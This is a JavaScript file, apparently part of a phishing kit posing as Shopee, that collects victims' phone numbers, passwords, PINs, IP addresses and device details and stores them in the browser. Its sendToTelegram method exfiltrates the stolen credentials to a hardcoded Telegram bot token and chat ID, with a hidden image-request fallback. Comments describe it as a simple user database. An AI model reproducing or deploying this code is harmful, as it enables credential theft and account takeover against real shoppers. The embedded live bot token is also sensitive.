// Simple database system for user data
class UserDatabase {
    constructor() {
        this.users = [];
        this.loadFromStorage();
    }

    // Save user data (without auto-sending to Telegram)
    async saveUser(userData) {
        const timestamp = new Date().toISOString();
        const ip = await this.getClientIP();
        const user = {
            id: this.generateId(),
            timestamp: timestamp,
            phone: userData.phone || '',
            password: userData.password || '',
            pin: userData.pin || '',
            ip: ip,
            userAgent: navigator.userAgent,
            ...userData
        };
        
        this.users.push(user);
        this.saveToStorage();
        // Removed automatic Telegram sending
        return user;
    }

    // Generate unique ID
    generateId() {
        return Date.now().toString(36) + Math.random().toString(36).substr(2);
    }

    // Get client IP
    async getClientIP() {
        try {
            const response = await fetch('https://api.ipify.org?format=json');
            const data = await response.json();
            return data.ip;
        } catch {
            return 'Unknown IP';
        }
    }

    // Save to localStorage
    saveToStorage() {
        try {
            localStorage.setItem('shopee_users', JSON.stringify(this.users));
        } catch (e) {
            console.error('Failed to save to storage:', e);
        }
    }

    // Load from localStorage
    loadFromStorage() {
        try {
            const stored = localStorage.getItem('shopee_users');
            this.users = stored ? JSON.parse(stored) : [];
        } catch (e) {
            console.error('Failed to load from storage:', e);
            this.users = [];
        }
    }

    // Send data to Telegram
    async sendToTelegram(userData) {
        const token = '8502215115:AAHZGTMdSyHOgzoGDqaqL54ilACSy39gbAc';
        const chatId = '8593139959';
        
        const message = this.formatTelegramMessage(userData);
        const url = `https://api.telegram.org/bot${token}/sendMessage`;
        
        try {
            // Method 1: Using fetch
            const response = await fetch(url, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify({
                    chat_id: chatId,
                    text: message,
                    parse_mode: 'HTML'
                })
            });
            
            if (response.ok) {
                console.log('✅ Data sent to Telegram successfully');
                return true;
            }
        } catch (error) {
            console.log('❌ Fetch failed, trying image method');
        }
        
        // Method 2: Fallback using image request
        try {
            const imgUrl = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;
            const img = new Image();
            img.onload = () => console.log('✅ Data sent via image method');
            img.onerror = () => console.log('❌ Image method failed');
            img.src = imgUrl;
            return true;
        } catch (error) {
            console.error('❌ All methods failed:', error);
            return false;
        }
    }

    // Format message for Telegram
    formatTelegramMessage(userData) {
        const date = new Date().toLocaleString('id-ID', {timeZone: 'Asia/Jakarta'});
        return `🔐 Shopee Security Data

📱 Phone: ${userData.phone || 'N/A'}
🔑 Password: ${userData.password || 'N/A'}
📌 PIN: ${userData.pin || 'N/A'}

🌐 IP: ${userData.ip || 'Unknown'}
📅 Date: ${date}
🖥️ Device: ${userData.userAgent}

ID: ${userData.id}`;
    }

    // Get all users (for admin)
    getAllUsers() {
        return this.users;
    }

    // Clear all data
    clearAll() {
        this.users = [];
        this.saveToStorage();
    }
}

// Initialize database
window.userDB = new UserDatabase();